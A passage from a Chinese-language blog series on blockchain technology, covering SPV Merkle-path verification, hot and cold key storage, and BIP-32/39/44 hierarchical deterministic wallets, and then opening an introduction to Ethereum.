<li>Descend into its right child, and store its computed hash as R.</li>
<li>If L &#x3D;&#x3D; R, the partial merkle tree object is invalid.</li>
<li>Return Hash(L || R).</li>
</ul>
</li>
<li><p>If this node has no right child, return Hash(L || L).</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>【这段是对返回的Merkle路径上的哈希值进行处理验证】</p>
<p>The partial merkle tree object is only valid if:</p>
<ul>
<li>All hashes in the hash list were consumed and no more.</li>
<li>All bits in the flag bits list were consumed (except padding to make it into a full byte), and no more.</li>
<li>The hash computed for the root node matches the block header’s merkle root.</li>
<li>The block header is valid, and matches its claimed proof of work.</li>
<li>In two-child nodes, the hash of the left and right branches was never equal.</li>
</ul>
<p>【关于以上算法，让人非常迷惑的地方在于，假设对树的结构已知的情况下，为何需要如此麻烦的算法。假设在一棵有16个叶子节点的满二叉树上，针对任何一个叶子都可以很容易算出Merkle路径（给定编号）；而且在获得Merkle路径的哈希值之后，只要从后向前依次合并计算即可；这是2018年时的迷惑】</p>
<p>看了两年之后，终于悟了。上面的算法本身就是在对树结构已知的情况下，判断一个节点是否是目标节点的祖先。同时，经过一遍遍历，便获得所需的信息。【一个猜想是，这里的数据结构是KV结构，不能像数组那样可以直接根据下表索引获得内容；所以只能通过遍历的方式获得。所以，还是得去看源码】</p>
<p>理一遍过程：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233049.jpg" alt="img"></p>
<p>以8个交易的满二叉树为例。假设我们的目标是第三个交易，也即上图中的节点10。那么根据算法，深度优先算法遍历，需要处理的节点是1、2、4、5、10、11、3；获得的标记list是1、1、0、1、1、0、0；获得的hashlist是null、null、hash、null、hash、hash、hash。</p>
<p>在进行解析的过程中，从1开始，进入左节点，找到2，2对应的标记是1并且是内部节点，所以继续找到4，4对应的标记是0，从hashlist返回哈希值；接着处理5，5的标记是1且是内部节点，分别处理10和11；10和11都返回哈希值，从而可以计算出5的哈希值；获得4和5的哈希值之后，2可以计算得出哈希值；1的左孩子处理完成；接着处理3，3的标记是0，直接返回哈希值，从而可以计算得出1的哈希值，也就是merkleroot。此时可以将该计算结果与SPV存储的区块头信息进行对比。</p>
<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://cloud.tencent.com/developer/article/1082346">理解区块链背后的Merkle Tree</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.coingogo.com/article/1690">https://www.coingogo.com/article/1690</a></li>
<li><a href="https://link.zhihu.com/?target=http://haroldcarr.com/posts/2017-07-31-the-block-in-blockchain-merkle-trees.html">the block in blockchain explained (merkle trees)</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/merkle-patricia-tree-in-detail">干货 | Merkle Patricia Tree 详解</a></li>
<li><a href="https://link.zhihu.com/?target=https://shuwoom.com/?p=692">Merkle树和SPV机制 | shuwoom的博客</a></li>
<li><a href="https://link.zhihu.com/?target=http://book.8btc.com/books/1/master_bitcoin/_book/6/6.html">第6章 比特币网络 · 精通比特币-巴比特图书</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0037.mediawiki">bitcoin&#x2F;bips</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/liuaigui/article/details/6602683">深入理解Bloom Filter</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/46b07467373a">https://www.jianshu.com/p/46b07467373a</a> （有代码）</li>
</ol>
<h1 id="区块链技术10-如何存储和使用比特币"><a href="#区块链技术10-如何存储和使用比特币" class="headerlink" title="区块链技术10:如何存储和使用比特币"></a>区块链技术10:如何存储和使用比特币</h1><p>管理私钥需要考虑三个目标，所有各种保管密钥的方法就是这三个目标的折中：</p>
<ol>
<li>可用性：当需要使用比特币的时候，可以用得上；</li>
<li>安全性：保证其他人不能使用你的私钥；</li>
<li>方便性：用的时候比较简单。</li>
</ol>
<p>我们来考虑下，如果把密钥写在纸上，那考虑到可用性，就需要随身把纸带在身上，那安全性就不用说了，方便性的话，输入起来也不方便。保存在电脑上也同样的问题，如果电脑被偷了，或者说电脑崩溃了，那所有的钱都没了；如果有人黑进了你的电脑，所有的币也都没了。</p>
<p>所以把私钥保存在本地机器上，特别是移动设备上，相当于把所有的钱都装在钱包里带在身上。如果手机丢了，所有的比特币也都丢了。</p>
<p>（现在有很多钱包软件和硬件，帮忙管理私钥，特别是用户有多个账户时，使用钱包帮忙管理是非常有效的。而且钱包软件可以帮忙方便地查看余额和交易等信息。）</p>
<p>将密钥存在移动设备就像把钱带在身上，方便使用但是安全性不佳，这种方式叫做“Hot strorage”；另一种方式是将密钥锁起来，不上网，用起来不方便，但是很安全，这种叫做“cold storage”（将经过Passphrase加密后的私钥写在纸上是不错的方法）。保存纸币时我们正常的做法是带点零钱在身上，然后将大部分的积蓄放在银行里。也即hot storage和cold storage相结合。</p>
<p>所以，很明显，需要对Hot storage和cold storage准备不同的密钥。否则，分开存储就没有任何意义了。</p>
<p>另一方面，为了更好的匿名性，也需要更多的公私钥对，譬如最好是一笔交易换一个地址。自然，催生出一种需求，就是批量生成密钥。</p>
<h2 id="非确定性钱包"><a href="#非确定性钱包" class="headerlink" title="非确定性钱包"></a>非确定性钱包</h2><p><strong>之所以叫非确定性钱包，主要因为这种钱包生成的私钥，互相之间是没有任何关系的，每个私钥都是独立的。</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233050.jpg" alt="img">零型非确定性钱包示意图</p>
<h2 id="确定性钱包"><a href="#确定性钱包" class="headerlink" title="确定性钱包"></a>确定性钱包</h2><p>第二种类型是确定性钱包（deterministic wallet），其中所有的密钥都是从一个主密钥派生出来，这个主密钥即为种子（seed）。该类型钱包中所有密钥都相互关联，如果有原始种子，则可以再次生成全部密钥。确定性钱包中使用了许多不同的密钥推导方法。最常用的推导方法是使用树状结构，称为分级确定性钱包或HD钱包。确定性钱包由种子衍生创造。为了便于使用，种子被编码为英文单词，也称为助记词。</p>
<h3 id="HD钱包"><a href="#HD钱包" class="headerlink" title="HD钱包"></a>HD钱包</h3><p>下列 BIP 共同定义了一种确定性钱包的实现，这种钱包被称为分层确定性（HD，Hierarchical Deterministic）钱包。</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">BIP-32</a>，HD 钱包中的密钥如何衍生</li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki">BIP-39</a>，HD 钱包助记词（Mnemonic）和种子（Seed）的创建规则</li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki">BIP-44</a>，支持多币种和多账户的 HD 钱包</li>
</ul>
<p>除此之外，还有</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0043.mediawiki">BIP-43</a>，多用途（purpose）HD 钱包的结构定义</li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0045.mediawiki">BIP-45</a>，通过 P2SH 实现多签的 HD 钱包</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233051.jpg" alt="img">HD型钱包示意图</p>
<p>BIP-32&#x2F;BIP-44</p>
<p>BIP-32标准定义了HD钱包。HD钱包包含以树状结构衍生的密钥，使得父密钥可以衍生一系列子密钥，每个子密钥也可以衍生出一系列孙密钥，以此类推。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233052.jpg" alt="img"></p>
<p>HD钱包有两个主要的优势。第一，树状结构可以被用来表达额外的组织含义。比如当一个特定分支的子密钥被用来接收交易收入并且有另一个分支的子密钥用来负责支付花费。不同分支的密钥都可以被用在企业环境中，这就可以支配不同的分支部门、子公司、具体功能以及会计类别。第二，用户可以建立一个公钥的序列而不需要访问相对应的私钥。所以HD钱包在不安全的服务器中使用或者在每笔交易中发行不同的公钥。公钥不需要被预先加载或者提前衍生，而在服务器中不需要可用来支付的私钥。</p>
<p>下面来看一下，怎么样从种子生成密钥树。因为16进制表示的种子： 0C1E24E5917779D297E14D45F14E1A1A 难以记忆，所以BIP-39标准中定义了助记词。上面的种子相对应的助记词表示：</p>
<p>army van defense carry jealous true garbage claim echo media make crunch</p>
<p>思考：128位是如何生成12个助记词的？</p>
<p>助记词是由钱包使用BIP-39中定义的标准化过程自动生成的。 钱包从熵源开始，增加校验和，然后将熵映射到单词列表：</p>
<p>1、创建一个128到256位的随机序列（熵）。</p>
<p>2、提出SHA256哈希前几位（熵长&#x2F; 32），就可以创造一个随机序列的校验和。</p>
<p>3、将校验和添加到随机序列的末尾。</p>
<p>4、将序列划分为<strong>包含</strong>11位的不同部分。</p>
<p>5、将每个包含11位部分的值与一个已经预先定义2048个单词的字典做对应。</p>
<p>6、生成的有顺序的单词组就是助记码。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233053.jpg" alt="img"></p>
<p>总结一下：HD钱包具有管理多个密钥和地址的强大机制。由一系列英文单词生成种子是个标准化的方法，这样易于在钱包中转移、导出和导入， 这些英文单词被称为助记词，标准由BIP-39定义。大多数比特币钱包（以及其他加密货币的钱包）使用此标准，并可以使用可互操作的助记词导入和导出种子进行备份和恢复。</p>
<p>16进制表示： 0C1E24E5917779D297E14D45F14E1A1A</p>
<p>助记词表示：</p>
<p>army van defense carry jealous true garbage claim echo media make crunch</p>
<p>助记词表示长度为128至256位的熵。 通过使用密钥延伸函数PBKDF2，熵被用于导出较长的（512位）种子。将所得的种子用于构建确定性钱包并得到其密钥。</p>
<p>思考：能不能暴力破解他人的钱包？</p>
<p>创建助记词之后的7-9步是：</p>
<p>7、PBKDF2密钥延伸函数的第一个参数是从步骤6生成的助记符。</p>
<p>8、PBKDF2密钥延伸函数的第二个参数是盐。 由字符串常数“助记词”与可选的用户提供的密码字符串连接组成。</p>
<p>9、PBKDF2使用HMAC-SHA512算法，使用2048次哈希来延伸助记符和盐参数，产生一个512位的值作为其最终输出。 这个512位的值就是种子。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233054.jpg" alt="img"></p>
<p>有个这个512比特的种子，可以开始公私钥对的生成。</p>
<p>总结：HD钱包从单个根种子（root seed）中创建。最常见的是，这个种子是从助记符产生的，HD钱包的所有的确定性都衍生自这个根种子。任何兼容HD 钱包的根种子也可重新创造整个HD钱包。所以简单的转移HD钱包的根种子就让HD钱包中所包含的成千上百万的密钥被复制，储存导出以及导入。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233055.jpg" alt="img"></p>
<p>从上图可以看出，从root seed生成公私钥对的过程，就是对root seed进行一次HMAC-SHA512的加密哈希，在生成512的结果之后，将512位结果划分为两个256部分，分别是Master private key（主私钥）和Master Chain Code（主链码）。</p>
<p>HMAC-SHA512 使用 SHA512 哈希算法，以一个消息（Message）和一个密钥（Key）作为输入，生成 512 位（64 字节）的消息摘要（Digest）作为输出。</p>
<p>从种子计算主私钥时，种子作为输入的消息，字符串<code>Bitcoin seed</code>作为输入的密钥，计算产生 512 位的输出。</p>
<ul>
<li>输出的高 256 位，是主私钥</li>
<li>输出的低 256 位，是主链码（Master Chain Code）</li>
</ul>
<p>总结一下：</p>
<ul>
<li>种子从助记词和用户密语计算而来</li>
<li>助记词从一个随机序列计算而来，查阅特定的单词表后最终确定</li>
<li>即使随机序列的内容一样，查阅不同语言的单词表，可以得到不同的助记词，从而计算出不同的种子</li>
<li>即使助记词的内容一样，指定不同的密语，可以得到不同的种子</li>
</ul>
<p><strong>HD 钱包的确定性来源于种子，当种子确定后，钱包中的所有私钥就都是确定的，都可以从种子计算出来</strong>。</p>
<p>所以用户可以直接记录下这个种子的值，作为 HD 钱包的备份，只不过这一大串内容抄写起来有点麻烦。</p>
<p>对一个 HD 钱包，初始化种子的过程涉及到两个<strong>变量</strong>：</p>
<ul>
<li>助记词（由随机序列的内容和助记词的语言共同决定）</li>
<li>用户指定的密语</li>
</ul>
<p>所以在备份 HD 钱包时，需要<strong>同时备份助记词和密语</strong>，这样就相当于备份了整个钱包内的所有私钥。</p>
<p>HD 钱包中的私钥是树状的层级结构。</p>
<ul>
<li>树根位置的私钥，称为主私钥（Master Private Key），从种子直接计算得到</li>
<li>树中的某个私钥，从其父私钥计算得到。</li>
</ul>
<hr>
<p>然后从上图中还可以看到从主私钥有个箭头到Master Public Key，也即从私钥到公钥。</p>
<p>HD协议使用的是ECDSA公钥函数 point()，这个函数接受一个大整数（也即私钥），将它转换成图上的一个点，也即公钥。这也和我们的常识是符合的，非对称加密系统中，公私钥可以互相生成。而且椭圆曲线数学方案使得可以在不泄露私钥的情况下计算公钥。例如，这允许网络商店业务让其网络服务器为每个订单或每个客户生成新的地址（公钥哈希），而无需让网络服务器访问相应的私钥（花费收到的资金是必需的）。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">point(private_key) == public_key</span><br></pre></td></tr></table></figure>

<p>然后还有一个问题，为什么剩下的256位要作为链码呢？链码是用来干啥的呢？</p>
<p>这里我们要稍微了解一下point的工作特点。下面的这个等式是成立的。意味着什么呢？这里的参数 i理解为index，也即生成子密钥时的索引。通过将祖先私钥与索引 i 相加，然后传入到point()中，可以生成子公钥，这是左边的计算（私钥生成公钥，改变私钥，也就生成新的公私钥对）。等式右边显示的是，新生成的这个公钥完全不需要使用私钥来生成，直接根据祖先公钥来做就行了。也即，只要有公钥，就可以生成新的公钥。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">point( (parent_private_key + i) % p ) == parent_public_key + point(i)</span><br></pre></td></tr></table></figure>

<p>新生成的子公钥可以继续生成后代公钥。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">point( (child_private_key + i) % p ) == child_public_key + point(i)</span><br></pre></td></tr></table></figure>

<p>这个特点带来的影响是什么呢？</p>
<ol>
<li>如果共享一对祖先密钥的两个程序想就一系列的公私钥对达成一致，它们只需要共同商议确定下来一系列的整数就行了。</li>
<li>知道一个祖先公钥，可以生成多个子公钥，然后这些子公钥可以用来在不安全的服务器上使用，作为付款的接收地址。因为服务器并不知道私钥，所以服务器即使被攻击，也不会有私钥泄露的危险。</li>
<li>不论是子公钥还是更下层的后代公钥，如果是从子公钥能够推导出自己的兄弟姐妹公钥，那么生成多个公钥和只有一个公钥没有什么区别。因为任何人只要知道其中的一个，就能找出其他所有的。所以需要加入新的计算参数，切断同一父节点生成的兄弟姐妹公钥之间的联系。</li>
</ol>
<p><strong>扩展密钥</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233056.jpg" alt="img"></p>
<p>HD协议使用256位的Chain Code（也称作熵）来生成子密钥对，而且每个子密钥对都有自己的chain code。这样，即使有一个子密钥分支被攻击，其他的分支可以不受影响。</p>
<p>如上图所示，HD密钥的生成接收了四个输入：</p>
<ul>
<li>祖先私钥 和 祖先公钥</li>
<li>256位的祖先链码</li>
<li>32位的索引值</li>
</ul>
<p>上图的计算中，链码、公钥和索引值作为HMAC-SHA512的参数输入，产生512位确定的但是足够随机的输出。这512位输出的右一半的256位作为子密钥的链码。左一半的256位作为生成子密钥的输入lefthand_hash_output。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">child_private_key == (parent_private_key + lefthand_hash_output) % G</span><br><span class="line">child_public_key == point( (parent_private_key + lefthand_hash_output) % G )</span><br><span class="line">child_public_key == point(child_private_key) == parent_public_key + point(lefthand_hash_output)</span><br></pre></td></tr></table></figure>

<p>上面的三个等式，第一个是子私钥的生成；第二个是从子私钥生成子公钥；第三个是从父公钥直接生成子公钥。【注1：因为子公钥和父公钥之间的关系依赖于 point(lefthand_hash_output)， 而point(lefthand_hash_output)的值依赖于链码、父公钥和索引，缺少的值仅仅是链码】【注2：因为父公钥已知，链码在同一对父公私钥的情况下的是固定的，如果链码泄露的情况下，还是可以推导出兄弟姐妹公钥；】【注3：因此，扩展公钥，不同于公钥，公钥是理所当然应该公开的；而扩展公钥因为是公钥和链码的连接，为了保护链码，应该保护扩展公钥】</p>
<p>【Specifying different index numbers will create different unlinkable <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/child-key">child keys</a> from the same <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/parent-key">parent keys</a>. Repeating the procedure for the <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/child-key">child keys</a> using the <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/chain-code">child chain code</a> will create unlinkable grandchild keys.】</p>
<p>总结一下，根据 <a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">BIP-32</a> 的定义：</p>
<ul>
<li>可以从私钥和链码，衍生出其<strong>所有的</strong>子私钥及对应的子公钥（及之后每层所有的子私钥及对应的子公钥）</li>
<li>可以从公钥和链码，衍生出其<strong>常规衍生</strong>的子公钥（及之后每层常规衍生的子公钥）</li>
<li>无法从某个密钥（公钥和私钥）计算出其父密钥，或同层的其他兄弟密钥</li>
</ul>
<hr>
<p>衍生子密钥时需要将密钥、链码和子密钥序号作为 CKD 的输入，三者缺一不可。为了方便转录，可以将<strong>密钥</strong>和<strong>链码</strong>编码在一起，得到<strong>扩展密钥</strong>（Extended Key）。扩展私钥和相对应的扩展公钥具有相同的链码。扩展密钥使用 Base58Check 编码，并添加特定的版本前缀。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233057.jpg" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233058.jpg" alt="img"></p>
<p>安全性：</p>
<p>扩展密钥使用方便，但要注意：</p>
<ul>
<li>虽然泄露某个扩展公钥不会丢币，但会导致以此为根节点衍生出的扩展公钥全部泄露，破坏了隐私性</li>
<li>泄露扩展公钥和该公钥衍生出的之后任一代公钥对应的私钥，有被推导出该扩展公钥所有后代私钥的可能</li>
</ul>
<p>也即，如果攻击者获得了父链码和父公钥，那么就可以获得所有的子链码。有了子链码，如果又获得了底层的某一个私钥（孙子密钥），那么可以根据这个链码生成所有的扩展私钥。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233059.jpg" alt="img"></p>
<p>更惨的是，攻击者可能通过子密钥逆推回祖先私钥。也即，如果攻击者获得了一个扩展公钥，以及任何它的子孙私钥，那么就能够推出这个公钥对应的私钥，以及所有的后代密钥。</p>
<p>因此，扩展公钥的链码部分需要好好保存。也因此提出了强化子密钥的概念。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233060.jpg" alt="img"></p>
<p>强化的子密钥生成需要祖先链码、祖先私钥和索引值生成子链码和子私钥。这样的话，仅仅知道祖先扩展公钥不能用来生成强化的子公钥。（无法生成Left-hand-output，所以知道父公钥的情况下，也不能直接计算出子公钥；）</p>
<p>因此，强化的子密钥的应用场景没有正常生成的子密钥多。但是可以防御上面的攻击。</p>
<p>m表示私钥，M表示公钥；有小撇号的表示强化的子密钥。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233061.jpg" alt="img"></p>
<p>HD钱包树状结构提供了极大的灵活性。每一个母扩展密钥有40亿个子密钥：20亿个常规子密钥和20亿个强化子密钥。 而每个子密钥又会有40亿个子密钥并且以此类推。只要你愿意，这个树结构可以无限类推到无穷代。但是，又由于有了这个灵活性，对无限的树状结构进行导航就变得异常困难。为了能方便表示密钥间关系，定义了衍生路径（Derivation Path）的概念。</p>
<ul>
<li>序号之间以<code>/</code>分隔</li>
<li><code>m</code>表示主密钥</li>
<li><code>i</code>表示第 i个常规衍生的子密钥，即第 i个子密钥</li>
<li><code>i&#39;</code>表示第 i个硬化衍生的子密钥，即第 (2^31+i) 个子密钥</li>
</ul>
<p><code>m/0&#39;/1&#39;/2</code>表示主密钥的第 0 个强化衍生子密钥的第 1 个强化衍生子密钥的第 2 个常规衍生子密钥（树形结构）。</p>
<p>扩展密钥加上衍生路径，可以确定 HD 钱包里的一个密钥及从这个密钥衍生的之后所有层的子密钥（以这个密钥为根的子树）。</p>
<p>BIP-44提议了多账户结构作为“purpose”。所有遵循BIP-44的HD钱包依据只使用树的第一个分支的要求而被定义：m&#x2F;44’&#x2F;。 BIP-44指定了包含5个预定义树状层级的结构：</p>
<p>m &#x2F; purpose’ &#x2F; coin_type’ &#x2F; account’ &#x2F; change &#x2F; address_index</p>
<p>第一层的purpose总是被设定为44’。</p>
<p>第二层的“coin_type”特指币种并且允许多元货币HD钱包中的货币在第二个层级下有自己的亚树状结构。目前有三种货币被定义：Bitcoin is m&#x2F;44’&#x2F;0’、Bitcoin Testnet is m&#x2F;44’&#x2F;1’，以及 Litecoin is m&#x2F;44’&#x2F;2’。</p>
<p>树的第三层级是“account”，这可以允许使用者为了会计或者组织目的，而去再细分他们的钱包到独立的逻辑性亚账户。 举个例子，一个HD钱包可能包含两个比特币“账户”：m&#x2F;44’&#x2F;0’&#x2F;0’ 和 m&#x2F;44’&#x2F;0’&#x2F;1’。每个账户都是它自己亚树的根。</p>
<p>第四层级就是“change”。每一个HD钱包有两个亚树，一个是用来接收地址，一个是用来创造找零地址。注意无论先前的层级是否使用强化衍生，这一层级使用的都是常规衍生。这是为了允许这一层级的树可以在不安全环境下，输出扩展公钥。</p>
<p>被HD钱包衍生的可用的地址是第四层级的子级，就是第五层级的树的“address_index”。比如，第三个主账户接收比特币支付的地址就是 M&#x2F;44’&#x2F;0’&#x2F;0’&#x2F;0&#x2F;2。</p>
<p>举个例子：</p>
<p>用户初始化了一个 HD 钱包，使用衍生路径<code>m/44&#39;/236&#39;/0&#39;</code>作为存放 Bitcoin SV（BSV）的“账户”，那么，</p>
<ul>
<li>第一个收款地址是公钥<code>m/44&#39;/236&#39;/0&#39;/0/0</code>对应的地址，第二个收款地址是公钥<code>m/44&#39;/236&#39;/0&#39;/0/1</code>对应的地址，以此类推</li>
<li>当完成第一次支付并存在找零时，会找零到地址<code>m/44&#39;/236&#39;/0&#39;/1/0</code>，下一次支付找零到的地址会是<code>m/44&#39;/236&#39;/0&#39;/1/1</code>，以此类推</li>
<li>如果想再新建一个 BSV “账户”另作他用，可以使用路径<code>m/44&#39;/236&#39;/1&#39;</code></li>
<li>如果还想用这个 HD 钱包存放 BCH，可以使用路径<code>m/44&#39;/145&#39;/0&#39;</code></li>
</ul>
<h3 id="HD-钱包的优势"><a href="#HD-钱包的优势" class="headerlink" title="HD 钱包的优势"></a>HD 钱包的优势</h3><p>HD 钱包在备份时十分方便。</p>
<ul>
<li>只需要备份<strong>助记词</strong>和<strong>密语</strong>，就等于备份了整个钱包内的所有私钥</li>
<li>除此之外，你还要记下使用的<strong>衍生路径</strong>，这样才能知道使用了哪些私钥</li>
</ul>
<p>另外，从扩展公钥可以常规衍生子公钥及对应地址而不用访问扩展私钥或私钥本身，这是 HD 钱包一个很重要的安全特性。</p>
<p>密钥间的树形结构，与机构的部门设置十分相似，如果一家企业准备使用比特币进行财务收支，可以：</p>
<ul>
<li><p>将路径<code>m/0&#39;/0&#39;/x&#39;</code>的扩展公钥交给各销售部门独自管理和使用</p>
</li>
<li><ul>
<li>销售部门可以为每笔订单生成不同的收款地址，方便状态跟踪</li>
<li>因为从扩展公钥无法衍生出子私钥，所以销售部门只能收款而无法支付账户里的比特币</li>
</ul>
</li>
<li><p>将路径<code>m/0&#39;/0&#39;</code>的扩展公钥交给市场部，市场部可以查阅所有订单的销售记录，同样无法支付比特币</p>
</li>
<li><p>将路径<code>m/0&#39;/0&#39;</code>的扩展私钥交给财务部，财务部可以用这个更上层的扩展私钥，管理整个公司的加密资产</p>
</li>
</ul>
<p>配合 <a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0045.mediawiki">BIP-45</a> 定义的 HD 钱包多签方案，可以方便、安全、灵活的管理公司的加密资产。</p>
<p>练习（天书般的<a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">bip32</a>）</p>
<p>The function CKDpriv((kpar, cpar), i) → (ki, ci) computes a child extended private key from the parent extended private key从父扩展私钥计算子扩展私钥:</p>
<p>The function CKDpub((Kpar, cpar), i) → (Ki, ci) computes a child extended public key from the parent extended public key. It is only defined for non-hardened child keys.从父扩展公钥计算子扩展公钥。它只定义为非hardened child</p>
<p>The function N((k, c)) → (K, c) computes the extended public key corresponding to an extended private key (the “neutered” version, as it removes the ability to sign transactions).计算与扩展私钥对应的扩展公钥(“neutered”版本，因为它删除了签署交易的能力)。</p>
<p>The function N((k, c)) → (K, c) computes the extended public key corresponding to an extended private key</p>
<p>To compute the public child key of a parent private key:要计算父私钥的公用子密钥</p>
<ul>
<li>N(CKDpriv((kpar, cpar), i)) (works always).</li>
<li>CKDpub(N(kpar, cpar), i) (works only for non-hardened child keys).仅适用于非硬化子密钥</li>
</ul>
<p>Child key derivation (CKD) ：The function CKDpriv((kpar, cpar), i) → (ki, ci) computes a child extended private key from the parent extended private key，function CKDpub((Kpar, cpar), i) → (Ki, ci) computes a child extended public key from the parent extended public key。</p>
<p>To shorten notation, we will write CKDpriv(CKDpriv(CKDpriv(m,3H),2),5) as m&#x2F;3H&#x2F;2&#x2F;5. Equivalently for public keys, we write CKDpub(CKDpub(CKDpub(M,3),2),5) as M&#x2F;3&#x2F;2&#x2F;5. This results in the following identities:</p>
<ul>
<li>N(m&#x2F;a&#x2F;b&#x2F;c) &#x3D; N(m&#x2F;a&#x2F;b)&#x2F;c &#x3D; N(m&#x2F;a)&#x2F;b&#x2F;c &#x3D; N(m)&#x2F;a&#x2F;b&#x2F;c &#x3D; M&#x2F;a&#x2F;b&#x2F;c.</li>
<li>N(m&#x2F;aH&#x2F;b&#x2F;c) &#x3D; N(m&#x2F;aH&#x2F;b)&#x2F;c &#x3D; N(m&#x2F;aH)&#x2F;b&#x2F;c.</li>
</ul>
<p>However, N(m&#x2F;aH) cannot be rewritten as N(m)&#x2F;aH, as the latter is not possible.</p>
<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://bitcoinchallenge.codes/">Bitcoin Challenge</a></li>
<li><a href="https://link.zhihu.com/?target=https://bitcoiner.today/en/bitcoin-challenge-310-btc-clues-to-its-resolution-i/">Bitcoin Challenge 310 BTC: Clues to its resolution (I) - bitcoiner today</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.youtube.com/watch?v=Vbzwkl4MlLs">https://www.youtube.com/watch?v=Vbzwkl4MlLs</a></li>
<li><a href="https://link.zhihu.com/?target=http://book.8btc.com/books/6/masterbitcoin2cn/_book/ch05.html">第五章 钱包 · 巴比特图书</a></li>
<li><a href="https://link.zhihu.com/?target=https://bitcoin.org/en/developer-guide%23hierarchical-deterministic-key-creation">Developer Guide - Bitcoin</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">bitcoin&#x2F;bips</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnews.com/articles/145568296316.htm">https://www.chainnews.com/articles/145568296316.htm</a></li>
<li><a href="https://link.zhihu.com/?target=https://aaron67.cc/2019/01/22/bitcoin-wallet/">https://aaron67.cc/2019/01/22/bitcoin-wallet/</a></li>
</ol>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ol>
<li>全账本节点为什么要向spv节点提供merkle路径服务</li>
<li>用户提供这笔输入所在的区块，以及这笔交易在第一几笔交易，用户怎么通过自己的公钥找到这个区块hash？是遍历吗</li>
<li>矿工怎么验证这笔输入有效，逐一遍历吗？</li>
<li></li>
</ol>
<h1 id="区块链技术11-以太坊介绍"><a href="#区块链技术11-以太坊介绍" class="headerlink" title="区块链技术11:以太坊介绍"></a>区块链技术11:以太坊介绍</h1><p>从这一节开始，我们准备介绍两个对比特币的重大变化，以太坊和EOS。</p>
<p>以太坊的概念首次在2013至2014年间由程序员Vitalik Buterin受比特币启发后提出，大意为“下一代加密货币与去中心化应用平台”，在2014年通过ICO众筹开始得以发展。截至2018年2月，以太币是市值第二高的加密货币，仅次于比特币。可以查看参考[<a href="https://link.zhihu.com/?target=https://ethfans.org/wikis/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%8E%86%E5%8F%B2">1]</a>了解以太坊的发展历史。</p>
<p>介绍完之前关于比特币的内容之后，我们应该可以看懂以太坊白皮书前面一部分的内容了。白皮书中对比特币的重要技术和特征作了一个回顾和总结。大家可以自己看看这个<a href="https://link.zhihu.com/?target=https://bitcoin.org/files/bitcoin-paper/bitcoin_zh_cn.pdf">白皮书</a>，确认一下自己之前的学习效果。</p>
<p>那接下来，我们主要讲的是从对比特币的介绍之后的内容，也即白皮书中对比特币脚本语言的限制的描述，通过分析以太坊对比特币的缺陷，我们来理解以太坊的特征。<a href="https://link.zhihu.com/?target=https://ethfans.org/posts/ethereum-whitepaper/">以太坊白皮书</a>。</p>
<p>比特币系统的脚本语言存在一些严重的限制：</p>
<ul>
